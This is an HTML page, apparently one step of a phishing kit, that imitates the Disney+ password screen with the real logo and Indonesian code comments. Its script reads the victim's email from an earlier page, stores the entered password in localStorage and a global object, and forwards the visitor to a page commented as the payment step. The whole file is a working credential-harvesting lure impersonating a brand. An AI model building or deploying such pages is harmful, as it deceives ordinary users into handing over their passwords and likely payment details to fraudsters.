<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Password | Disney+</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #00637c 0%, #0a4d68 50%, #0e3d54 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .logo-atas {
            margin-bottom: 24px;
        }
        .logo-atas img {
            height: 32px;
            display: block;
            margin: 0 auto;
        }
        .kotak-login {
            background: #ffffff;
            border-radius: 8px;
            padding: 32px 28px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }
        h2 {
            font-size: 20px;
            color: #000;
            margin-bottom: 10px;
            font-weight: 600;
        }
        .email-terisi {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .email-terisi a {
            color: #0099cc;
            text-decoration: none;
            font-size: 13px;
        }
        .label-input {
            font-size: 14px;
            color: #333;
            margin-bottom: 8px;
            display: block;
            font-weight: 500;
        }
        .input-sandi {
            width: 100%;
            padding: 12px 10px;
            background: #f3f3f4;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 15px;
            margin-bottom: 10px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-sandi:focus {
            border-color: #0099cc;
            background: #fff;
        }
        .tombol-lanjut {
            width: 100%;
            padding: 13px;
            background-color: #000000;
            color: #ffffff;
            border: none;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin: 12px 0 24px 0;
        }
        .tombol-lanjut:hover {
            background-color: #333;
        }
        .tautan-bantuan {
            font-size: 13px;
            margin-bottom: 24px;
        }
        .tautan-bantuan a {
            color: #0099cc;
            text-decoration: none;
        }
        .tautan-bantuan a:hover {
            text-decoration: underline;
        }
        .garis-pemisah {
            border-bottom: 1px solid #eee;
            margin: 12px 0;
        }
        .teks-bawah {
            font-size: 11px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .teks-bawah a {
            color: #0099cc;
            text-decoration: none;
        }
        .logo-sponsor {
            text-align: center;
            margin-top: 8px;
        }
        .logo-sponsor img {
            height: 28px;
            opacity: 0.85;
        }
    </style>
</head>
<body>

    <div class="logo-atas">
        <!-- ✅ LOGO DISNEY+ SUDAH DIPERBAIKI -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg" alt="Disney+">
    </div>

    <div class="kotak-login">
        <h2>Enter your password</h2>
        <p class="email-terisi" id="tampilEmail">— <a href="index.html">Change</a></p>

        <label class="label-input">Password</label>
        <input type="password" class="input-sandi" id="kataSandi" placeholder="Enter your password">

        <button class="tombol-lanjut" onclick="simpanSandiLanjut()">Log In</button>

        <div class="tautan-bantuan">
            <a href="#">Forgot your password?</a>
        </div>

        <div class="garis-pemisah"></div>

        <p class="teks-bawah">
            Don't have an account? <a href="#">Sign up</a>.
        </p>

        <!-- ✅ LOGO SPONSOR SUDAH DIPERBAIKI -->
        <div class="logo-sponsor">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg" alt="Sponsor Logo">
        </div>
    </div>

    <script>
        // === TAMPILKAN EMAIL DARI HALAMAN SEBELUMNYA ===
        const emailPengguna = localStorage.getItem('emailPengguna') || 'TIDAK DIKETAHUI';
        document.getElementById('tampilEmail').innerHTML = `${emailPengguna} <a href="index.html">Change</a>`;

        // === OBJEK DATA UNTUK HALAMAN BERLANGGANAN ===
        if (typeof DataPengguna === 'undefined') window.DataPengguna = {};
        DataPengguna.ambilEmail = () => emailPengguna;

        // === SIMPAN KATA SANDI & LANJUT KE HALAMAN PEMBAYARAN ===
        function simpanSandiLanjut() {
            const kataSandi = document.getElementById('kataSandi').value.trim();
            if (!kataSandi) {
                alert('⚠️ Silakan masukkan kata sandi!');
                return;
            }

            // Simpan agar halaman berikutnya bisa membaca
            localStorage.setItem('kataSandi', kataSandi);
            DataPengguna.ambilKataSandi = () => kataSandi;

            // Buka halaman pembayaran
            window.location.href = "berlangganan.html";
        }
    </script>
</body>
</html>
